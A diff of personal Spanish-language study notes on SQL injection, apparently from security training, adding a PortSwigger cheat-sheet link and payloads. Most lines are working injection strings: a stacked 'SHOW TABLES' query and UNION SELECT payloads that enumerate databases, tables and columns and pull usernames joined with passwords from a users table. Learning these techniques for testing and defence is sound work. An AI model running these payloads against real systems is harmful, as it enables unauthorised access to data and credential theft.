@@ -1,4 +1,6 @@
 	####SQLi
+Portswigger cheatsheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
+
 Las inyeccioones de SQL se abusan de el input de un usuario no sanitizado. De esta forma, de podria intrducir codigo com "SHOW TABLES;" al buscar un usuario por una barra de busqueda.
 select * from logins where username like '%1'; SHOW TABLES;'
 #En este ejemplo se introdujo 1'; SHOW TABLES;
@@ -93,11 +95,14 @@ SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
 #Nos devuelve todos los noombres de las bases de datos existentes
 cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
 #Lo mismo pero con UNION
+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+#Sirve para obtener dos columnas juntas en caso de no tener suficientes
 cn' UNION select 1,database(),2,3-- -
 #Nos permite conocer la base de datos a la cual se le realizan las consultas
 cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<database>'-- -
 #Nos permite listar los nombres de la tablas y la db a la que pertenece. En este caso se busca para que la db solicitada sea dev
-#El segundo parametro puede ser un tanto redundante
+#where table_schema='<database>' puede obviarse (recomendado)
+
 cn' UNION select 1,COLUMN_NAME,2,3 from INFORMATION_SCHEMA.COLUMNS where table_name='<table>'-- - 
 #Busco los nombres de las columbas de la tabla credenciales que me aparecio antes
 cn' UNION select 1, <columna1>, <columna2>, 4 from <database>.<table>-- -
